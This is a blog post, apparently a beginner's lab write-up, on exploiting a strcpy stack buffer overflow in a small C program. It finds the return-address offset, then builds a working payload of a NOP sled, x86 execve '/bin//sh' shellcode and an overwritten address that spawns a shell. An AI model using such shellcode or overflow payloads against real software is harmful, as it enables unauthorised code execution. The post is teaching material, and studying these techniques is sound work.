---
author: NotCare
pubDatetime: 2021-09-28T05:14:00Z
title: Spawn a shell (part 2)
postSlug: spawn-a-shell
featured: false
draft: false
tags:
  - research
  - code
ogImage: ""
description: Let's spawn a shell with strcpy()
---

## Overview

Following is a program demonstrating string copy function in c which is unsafe and we'll see how can we exploit it.

## Code

```c
  1 #include <stdio.h>
  2 #include <string.h>
  3
  4 void func(char *name)
  5 {
  6     char buf[100];
  7     strcpy(buf, name);
  8     printf("Welcome %s\n", buf);
  9 }
 10
 11 int main(int argc, char *argv[])
 12 {
 13    func(argv[1]);
 14    return 0;
 15 }
```

## Challenge:

Spawn a shell by overflowing `buf`.

## Approach:

Lets understand some of the new terms thats being used ahead.

- NOP sled: aka "no operation" is a machine instruction that does nothing and go ahead, so a NOP sled would be a huge operation of basically nothing :D
- shellcode: these are assembly instructions used for various puposes like spawning a shell or reverse listener

here's a brief overview of what we're going to do:
Fill the buffer with NOP sleds + shellcode for `/bin/sh` + overwrite the eip with address of somewhere in NOP sled.

## Reconn:

Lets find out the offset, we'll do metasploit just like before.
*[Image: patterncreate]*
lets run it
*[Image: patterncreate]*
we get a segfault, copy the address and query pattern_offset
*[Image: patterncreate]*
We get a match at 112, that means 113th is where our eip starts.

with all that in our hands, lets go back and recall the brief overview as qouted `overwrite the eip with address of somewhere in NOP sled`, whats that? why though?
okay so basically, by pointing our eip to an address somewhere in NOP will eventually lead it our shellcode which in turns spawns the shell. That's what we're here for right?
Last thing, lets pick an address
*[Image: patterncreate]*
I've picked `0xffffcf40` but we need that in reverse (little endian my guy :D) so thats going to be uhhh `\x40\xcf\xff\xff`
we have everything we need, now its time to put it all together.

## Exploit:

quick maths for the exploit:
so our shellcode is of `25` bytes, I've chosen NOP sleds to be of length `67` that gives us `25 + 67 = 92` we need `20` more, lets fill them with `\x42`.

`25 + 67 + 20 = 112`, now we need 4 bytes that will be our address
payload:

```markdown
run $(python -c 'print "\x90"*67 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x42\x42\x42\x42"*5 + "\x40\xcf\xff\xff"')
```

lets run it

*[Image: patterncreate]*
lets gooooo, we get a shell here!<br>
Thanks for reading!
